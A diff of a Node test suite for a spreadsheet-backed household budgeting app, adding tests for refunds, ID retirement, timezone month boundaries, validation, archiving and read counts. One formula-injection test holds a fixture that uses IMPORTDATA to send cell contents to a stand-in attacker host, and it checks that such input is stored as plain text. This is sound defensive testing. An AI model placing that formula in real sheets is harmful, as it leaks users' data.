@@ -11,7 +11,7 @@
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
 import { createTransaction, createPocket, deleteTransaction, updatePocket, handleRequest } from '../backend/05_Api.gs.js';
-import { dailyRollover } from '../backend/07_Entry.gs.js';
+import { dailyRollover, setup as setupFn } from '../backend/07_Entry.gs.js';
 import { installGlobals, createProps } from './helpers/appsScriptGlobals.js';
 import { freshWorkbook } from './helpers/fixtures.js';
 
@@ -154,7 +154,7 @@ test('FLUSH: the lock is still released if the flush itself throws', () => {
 });
 
 test('FLUSH: the rollover takes the same lock, flushes, and releases', () => {
-  const s = setup({ pockets: [['P01', 'Groceries', 'Chase', 800, 100, 'Active']] });
+  const s = setup({ pockets: [['P01', 'Groceries', 'Chase', 800, 100, 'Active']], props: { LAST_ROLLOVER_KEY: '2026-01' } });
   dailyRollover();
   assert.equal(s.balance(), 800, 'rolled over to the limit');
   const tail = s.events.slice(s.events.indexOf('lock'));
@@ -163,11 +163,11 @@ test('FLUSH: the rollover takes the same lock, flushes, and releases', () => {
 });
 
 test('FLUSH: a rollover that cannot get the lock changes nothing and will retry', () => {
-  const s = setup({ pockets: [['P01', 'Groceries', 'Chase', 800, 100, 'Active']] });
+  const s = setup({ pockets: [['P01', 'Groceries', 'Chase', 800, 100, 'Active']], props: { LAST_ROLLOVER_KEY: '2026-01' } });
   s.hold();   // an expense is mid-flight
   assert.throws(() => dailyRollover(), /script lock/);
   assert.equal(s.balance(), 100, 'balances untouched');
-  assert.equal(globalThis.PropertiesService.getScriptProperties().getProperty('LAST_ROLLOVER_KEY'), null,
+  assert.equal(globalThis.PropertiesService.getScriptProperties().getProperty('LAST_ROLLOVER_KEY'), '2026-01',
     'the month is not marked done, so the next run retries');
   s.restore();
 });
@@ -214,7 +214,7 @@ test('ATOMIC: the server stamps the time; a client timestamp is ignored (even a 
 
 test('ATOMIC delete: if the refund fails, the transaction is kept', () => {
   const s = setup({ pockets: [['P01', 'Groceries', 'Chase', 800, 90, 'Active']],
-    txns: [['T1001', new Date('2026-10-01T10:00:00Z'), 'Alex', 'P01', 10, '']] });
+    txns: [['T1001', new Date(), 'Alex', 'P01', 10, '']] });
   const realGetRange = s.wb.pockets.getRange.bind(s.wb.pockets);
   s.wb.pockets.getRange = (row, col, ...rest) => {
     const range = realGetRange(row, col, ...rest);
@@ -230,7 +230,7 @@ test('ATOMIC delete: if the refund fails, the transaction is kept', () => {
 
 test('ATOMIC delete: if removing the row fails, the refund is undone', () => {
   const s = setup({ pockets: [['P01', 'Groceries', 'Chase', 800, 90, 'Active']],
-    txns: [['T1001', new Date('2026-10-01T10:00:00Z'), 'Alex', 'P01', 10, '']] });
+    txns: [['T1001', new Date(), 'Alex', 'P01', 10, '']] });
   s.wb.txns.deleteRow = () => { throw new Error('delete failed'); };
   const r = viaDispatcher('deleteTransaction', { txnId: 'T1001' });
   assert.equal(r.ok, false);
@@ -241,7 +241,7 @@ test('ATOMIC delete: if removing the row fails, the refund is undone', () => {
 
 test('ATOMIC delete: the happy path still refunds and removes', () => {
   const s = setup({ pockets: [['P01', 'Groceries', 'Chase', 800, 90, 'Active']],
-    txns: [['T1001', new Date('2026-10-01T10:00:00Z'), 'Alex', 'P01', 10, '']] });
+    txns: [['T1001', new Date(), 'Alex', 'P01', 10, '']] });
   const r = deleteTransaction({ token: TOKEN, txnId: 'T1001' });
   assert.equal(r.ok, true);
   assert.equal(s.balance(), 100);
@@ -258,6 +258,7 @@ test('ROLLOVER: balances are actually written back to the limit, archived pocket
       ['P02', 'Fuel', 'Chase', 300, 0, 'Active'],
       ['P03', 'Old', 'Chase', 50, 5, 'Archived'],
     ],
+    props: { LAST_ROLLOVER_KEY: '2026-01' },
   });
   dailyRollover();
   assert.deepEqual(s.wb.pockets._rows.slice(1).map((r) => r[4]), [800, 300, 5]);
@@ -265,10 +266,299 @@ test('ROLLOVER: balances are actually written back to the limit, archived pocket
 });
 
 test('ROLLOVER: running again in the same month does not reset spending', () => {
-  const s = setup({ pockets: [['P01', 'Groceries', 'Chase', 800, 800, 'Active']] });
+  const s = setup({ pockets: [['P01', 'Groceries', 'Chase', 800, 800, 'Active']], props: { LAST_ROLLOVER_KEY: '2026-01' } });
   dailyRollover();
   createTransaction({ token: TOKEN, user: 'Alex', pocketId: 'P01', amount: 100 });
   dailyRollover();
   assert.equal(s.balance(), 700);
+  s.restore();
+});
+
+/* ------------------------------------------------- limit changes (item 9) -- */
+
+test('LIMITS: raising the limit of a depleted pocket gives it money, so it can be spent again', () => {
+  const s = setup({ pockets: [['P01', 'Groceries', 'Chase', 100, 0, 'Active']] });
+  assert.equal(spend({ amount: 5 }).error, 'INSUFFICIENT_FUNDS');
+  const r = updatePocket({ token: TOKEN, pocketId: 'P01', limit: 150 });
+  assert.equal(r.pocket.balance, 50);
+  assert.equal(r.pocket.isLocked, false);
+  assert.equal(spend({ amount: 5, requestId: 'req-0002-bbbb' }).ok, true);
+  s.restore();
+});
+
+/* ---------------------------------------- deleting old expenses (item 10) -- */
+
+test('DELETE: removing an expense from an EARLIER month does not refund this month', () => {
+  const s = setup({
+    pockets: [['P01', 'Groceries', 'Chase', 800, 800, 'Active']],
+    txns: [['T1001', new Date('2020-03-10T10:00:00Z'), 'Alex', 'P01', 500, 'old']],
+  });
+  const r = deleteTransaction({ token: TOKEN, txnId: 'T1001' });
+  assert.equal(r.ok, true);
+  assert.equal(r.refunded, false, 'the reply says no refund was made');
+  assert.equal(s.wb.txns._rows.length, 1, 'but the row is gone from the history');
+  s.restore();
+  const s2 = setup({
+    pockets: [['P01', 'Groceries', 'Chase', 800, 300, 'Active']],
+    txns: [['T1001', new Date('2020-03-10T10:00:00Z'), 'Alex', 'P01', 100, 'old']],
+  });
+  deleteTransaction({ token: TOKEN, txnId: 'T1001' });
+  assert.equal(s2.balance(), 300, 'this month\'s balance is untouched');
+  s2.restore();
+});
+
+test('DELETE: removing this month\'s expense still refunds it', () => {
+  const s = setup({
+    pockets: [['P01', 'Groceries', 'Chase', 800, 300, 'Active']],
+    txns: [['T1001', new Date(), 'Alex', 'P01', 100, 'new']],
+  });
+  const r = deleteTransaction({ token: TOKEN, txnId: 'T1001' });
+  assert.equal(r.refunded, true);
+  assert.equal(s.balance(), 400);
+  s.restore();
+});
+
+/* ----------------------------------------------------- id reuse (item 11) -- */
+
+test('IDS: deleting the newest transaction does not free its id', () => {
+  const s = setup({ pockets: [['P01', 'Groceries', 'Chase', 800, 800, 'Active']] });
+  const a = spend({ requestId: 'req-0001-aaaa' });
+  const b = spend({ requestId: 'req-0002-bbbb' });
+  assert.equal(deleteTransaction({ token: TOKEN, txnId: b.transaction.id }).ok, true);
+  const c = spend({ requestId: 'req-0003-cccc' });
+  assert.notEqual(c.transaction.id, b.transaction.id, 'the deleted id is retired, not recycled');
+  assert.ok(Number(c.transaction.id.slice(1)) > Number(b.transaction.id.slice(1)));
+  assert.ok(a.transaction.id < b.transaction.id);
+  s.restore();
+});
+
+test('IDS: a stale phone deleting an id that was already removed cannot hit a newer expense', () => {
+  const s = setup({ pockets: [['P01', 'Groceries', 'Chase', 800, 800, 'Active']] });
+  const old = spend({ requestId: 'req-0001-aaaa' });
+  deleteTransaction({ token: TOKEN, txnId: old.transaction.id });          // phone B deletes it
+  const fresh = spend({ requestId: 'req-0002-bbbb' });                      // then logs another
+  const stale = viaDispatcher('deleteTransaction', { txnId: old.transaction.id });   // phone A, still showing the old row
+  assert.equal(stale.ok, false);
+  assert.equal(stale.error, 'TRANSACTION_NOT_FOUND');
+  assert.equal(s.wb.txns._rows.length, 2, 'the newer expense survives');
+  assert.equal(s.wb.txns._rows[1][0], fresh.transaction.id);
+  s.restore();
+});
+
+test('IDS: a deleted pocket row does not hand its id to the next pocket', () => {
+  const s = setup({ pockets: [['P01', 'Groceries', 'Chase', 800, 800, 'Active']] });
+  const p2 = createPocket({ token: TOKEN, name: 'Fuel', account: '', limit: 100 });
+  assert.equal(p2.pocket.id, 'P02');
+  s.wb.pockets.deleteRow(3);                      // someone removes the row by hand in the sheet
+  const p3 = createPocket({ token: TOKEN, name: 'Gifts', account: '', limit: 100 });
+  assert.equal(p3.pocket.id, 'P03', 'P02 is retired: old transactions may still point at it');
+  s.restore();
+});
+
+test('IDS: nextTransactionId / nextPocketId honour the highest number ever issued', async () => {
+  const { nextTransactionId, nextPocketId } = await import('../backend/01_Utils.gs.js');
+  assert.equal(nextTransactionId(['T1001'], 1005), 'T1006');
+  assert.equal(nextTransactionId(['T1009'], 1005), 'T1010', 'rows above the counter still win');
+  assert.equal(nextPocketId(['P01'], 4), 'P05');
+  assert.equal(nextPocketId([], 0), 'P01');
+});
+
+/* ----------------------------------------------------- timezone (item 12) -- */
+
+test('TZ: getState counts an expense logged at 00:30 SAST on the 1st in the NEW month', () => {
+  const s = setup({
+    pockets: [['P01', 'Groceries', 'Chase', 800, 700, 'Active']],
+    txns: [
+      ['T1001', new Date('2026-09-30T22:30:00Z'), 'Alex', 'P01', 40, 'just after midnight SAST'],
+      ['T1002', new Date('2026-09-30T21:30:00Z'), 'Alex', 'P01', 60, 'just before midnight SAST'],
+    ],
+  });
+  const oct = viaDispatcher('getState', { month: '2026-10' });
+  const sep = viaDispatcher('getState', { month: '2026-09' });
+  assert.equal(oct.pockets[0].spent, 40, 'only the 00:30 expense is October');
+  assert.equal(sep.pockets[0].spent, 60, 'the 23:30 one is still September');
+  s.restore();
+});
+
+/* ------------------------------------------------ formula injection (13) -- */
+
+test('INJECTION: text that would run as a formula is stored as plain text', () => {
+  const s = setup();
+  const evil = '=IMPORTDATA("https://evil.example/?"&A1)';
+  assert.equal(spend({ note: evil }).ok, true);
+  assert.equal(s.wb.txns._rows[1][5], "'" + evil, 'note');
+
+  const made = createPocket({ token: TOKEN, name: '=HYPERLINK("x")', account: '+cmd', limit: 10 });
+  assert.equal(made.ok, true);
+  assert.equal(made.pocket.name, '=HYPERLINK("x")', 'the reply shows what the user typed');
+  const row = s.wb.pockets._rows[2];
+  assert.equal(row[1], "'=HYPERLINK(\"x\")");
+  assert.equal(row[2], "'+cmd");
+
+  updatePocket({ token: TOKEN, pocketId: 'P01', name: '@SUM(1)', account: '-1+1' });
+  assert.equal(s.wb.pockets._rows[1][1], "'@SUM(1)");
+  assert.equal(s.wb.pockets._rows[1][2], "'-1+1");
+  s.restore();
+});
+
+test('INJECTION: ordinary text is written untouched', () => {
+  const s = setup();
+  spend({ note: 'Whole Foods = fine, 5+5' });
+  assert.equal(s.wb.txns._rows[1][5], 'Whole Foods = fine, 5+5');
+  s.restore();
+});
+
+/* ------------------------------------------- server-side validation (14) -- */
+
+test('VALIDATION: updatePocket refuses a blank name, a zero limit, and over-long text', () => {
+  const s = setup();
+  const before = JSON.stringify(s.wb.pockets._rows);
+  for (const [patch, code] of [
+    [{ name: '' }, 'INVALID_NAME'],
+    [{ name: '   ' }, 'INVALID_NAME'],
+    [{ name: 'x'.repeat(61) }, 'INVALID_NAME'],
+    [{ account: 'y'.repeat(61) }, 'INVALID_NAME'],
+    [{ limit: 0 }, 'INVALID_AMOUNT'],
+    [{ limit: '0.00' }, 'INVALID_AMOUNT'],
+    [{ limit: -5 }, 'INVALID_AMOUNT'],
+  ]) {
+    const r = viaDispatcher('updatePocket', { pocketId: 'P01', ...patch });
+    assert.equal(r.ok, false, JSON.stringify(patch));
+    assert.equal(r.error, code, JSON.stringify(patch));
+  }
+  assert.equal(JSON.stringify(s.wb.pockets._rows), before, 'nothing was written');
+  s.restore();
+});
+
+test('VALIDATION: updatePocket still accepts good edits, an empty account, and a 60-char name', () => {
+  const s = setup();
+  assert.equal(viaDispatcher('updatePocket', { pocketId: 'P01', name: 'x'.repeat(60) }).ok, true);
+  assert.equal(viaDispatcher('updatePocket', { pocketId: 'P01', account: '' }).ok, true);
+  assert.equal(viaDispatcher('updatePocket', { pocketId: 'P01', limit: 500 }).ok, true);
+  s.restore();
+});
+
+test('VALIDATION: createPocket applies the same length limits', () => {
+  const s = setup();
+  assert.equal(viaDispatcher('createPocket', { name: 'x'.repeat(61), limit: 10 }).error, 'INVALID_NAME');
+  assert.equal(viaDispatcher('createPocket', { name: 'ok', account: 'y'.repeat(61), limit: 10 }).error, 'INVALID_NAME');
+  assert.equal(viaDispatcher('createPocket', { name: 'ok', limit: 10 }).ok, true);
+  s.restore();
+});
+
+/* ---------------------------------------------- configurable household (users) -- */
+
+test('USERS: the household comes from the USERS Script Property, not from code', () => {
+  const s = setup({ props: { USERS: ' Thandi , Pieter ,Thandi,' } });
+  assert.equal(spend({ user: 'Thandi' }).ok, true);
+  assert.equal(viaDispatcher('createTransaction', { user: 'Alex', pocketId: 'P01', amount: 1 }).error, 'INVALID_USER');
+  assert.deepEqual(viaDispatcher('getState', {}).summary.users, ['Thandi', 'Pieter'], 'trimmed, de-duplicated');
+  s.restore();
+});
+
+test('USERS: with the property unset or blank the built-in default applies', () => {
+  for (const props of [{}, { USERS: '' }, { USERS: ' , ' }]) {
+    const s = setup({ props });
+    assert.deepEqual(viaDispatcher('getState', {}).summary.users, ['Alex', 'Sam']);
+    s.restore();
+  }
+});
+
+test('USERS: setup() publishes the default so it can be edited in Script Properties', () => {
+  const s = setup();
+  globalThis.ScriptApp = { getProjectTriggers: () => [], deleteTrigger() {}, newTrigger: () => { const b = { timeBased: () => b, everyDays: () => b, atHour: () => b, create() {} }; return b; } };
+  try {
+    setupFn();
+    assert.equal(globalThis.PropertiesService.getScriptProperties().getProperty('USERS'), 'Alex,Sam');
+  } finally { delete globalThis.ScriptApp; }
+  s.restore();
+});
+
+test('USERS: the report splits spend between the configured names', () => {
+  const s = setup({ props: { USERS: 'Thandi,Pieter', LAST_ROLLOVER_KEY: new Date().toISOString().slice(0, 7) } });
+  dailyRollover();
+  const flat = s.wb.report._rows.map((r) => r.join('|')).join('\n');
+  assert.match(flat, /Thandi/);
+  assert.match(flat, /Pieter/);
+  assert.doesNotMatch(flat, /Alex/);
+  s.restore();
+});
+
+/* --------------------------------------------------- archive / restore -- */
+
+test('ARCHIVE: getState lists archived pockets separately from the active ones', () => {
+  const s = setup({ pockets: [['P01', 'Groceries', 'Chase', 800, 800, 'Active'], ['P02', 'Old', 'Chase', 50, 5, 'Archived']] });
+  const st = viaDispatcher('getState', {});
+  assert.deepEqual(st.pockets.map((p) => p.id), ['P01']);
+  assert.deepEqual(st.archivedPockets, [{ id: 'P02', name: 'Old', account: 'Chase', limit: 50 }]);
+  s.restore();
+});
+
+test('ARCHIVE: restoring a pocket gives it what this month\'s spending leaves, not its stale balance', () => {
+  const s = setup({
+    pockets: [['P02', 'Old', 'Chase', 200, 5, 'Archived']],       // archived with R5 left, long ago
+    txns: [['T1001', new Date(), 'Alex', 'P02', 30, 'this month'],
+           ['T1002', new Date('2020-01-05T10:00:00Z'), 'Alex', 'P02', 500, 'ancient']],
+  });
+  const r = viaDispatcher('updatePocket', { pocketId: 'P02', unarchive: true });
+  assert.equal(r.ok, true);
+  assert.equal(r.pocket.balance, 170, '200 limit - 30 spent this month');
+  assert.equal(s.wb.pockets._rows[1][5], 'Active');
+  assert.equal(s.wb.pockets._rows[1][4], 170);
+  s.restore();
+});
+
+test('ARCHIVE: "unarchive" on a pocket that is already active leaves its balance alone', () => {
+  const s = setup({ pockets: [['P01', 'Groceries', 'Chase', 800, 321, 'Active']] });
+  viaDispatcher('updatePocket', { pocketId: 'P01', unarchive: true });
+  assert.equal(s.balance(), 321);
+  s.restore();
+});
+
+/* ------------------------------------------------------ read costs (perf) -- */
+
+/** Count how many times each sheet's getRange is called while `fn` runs. */
+function countReads(wb, fn) {
+  const counts = { pockets: 0, txns: 0 };
+  const wrap = (sheet, key) => {
+    const real = sheet.getRange.bind(sheet);
+    sheet.getRange = (...a) => { counts[key] += 1; return real(...a); };
+  };
+  wrap(wb.pockets, 'pockets'); wrap(wb.txns, 'txns');
+  fn();
+  return counts;
+}
+
+test('PERF: getState reads the Transactions sheet once, not twice', () => {
+  const s = setup({ pockets: [['P01', 'Groceries', 'Chase', 800, 700, 'Active']],
+    txns: [['T1001', new Date(), 'Alex', 'P01', 5, ''], ['T1002', new Date(), 'Sam', 'P01', 6, '']] });
+  const c = countReads(s.wb, () => viaDispatcher('getState', {}));
+  assert.equal(c.txns, 1);
+  assert.equal(c.pockets, 1);
+  s.restore();
+});
+
+test('PERF: logging an expense reaches into the Pockets sheet three times, not four', () => {
+  const s = setup();
+  const c = countReads(s.wb, () => spend());
+  // read the pockets once; find the row and write the balance
+  assert.ok(c.pockets <= 3, 'pocket sheet touched ' + c.pockets + ' times');
+  s.restore();
+});
+
+test('PERF: the Request ID header is checked once, not on every write', () => {
+  const s = setup();
+  spend({ requestId: 'req-0001-aaaa' });
+  const c = countReads(s.wb, () => spend({ requestId: 'req-0002-bbbb' }));
+  assert.equal(globalThis.PropertiesService.getScriptProperties().getProperty('REQUEST_ID_HEADER'), 'done');
+  assert.ok(c.txns <= 6, 'transactions sheet touched ' + c.txns + ' times on the second write');
+  s.restore();
+});
+
+test('SORT: with equal timestamps the higher id number comes first (T10000 after T9999)', async () => {
+  const { readTransactions } = await import('../backend/03_Sheets.gs.js');
+  const t = new Date('2026-10-01T10:00:00Z');
+  const s = setup({ txns: [['T9999', t, 'Alex', 'P01', 1, ''], ['T10000', t, 'Alex', 'P01', 1, ''], ['T1001', t, 'Alex', 'P01', 1, '']] });
+  assert.deepEqual(readTransactions().map((x) => x.id), ['T10000', 'T9999', 'T1001']);
   s.restore();
 });
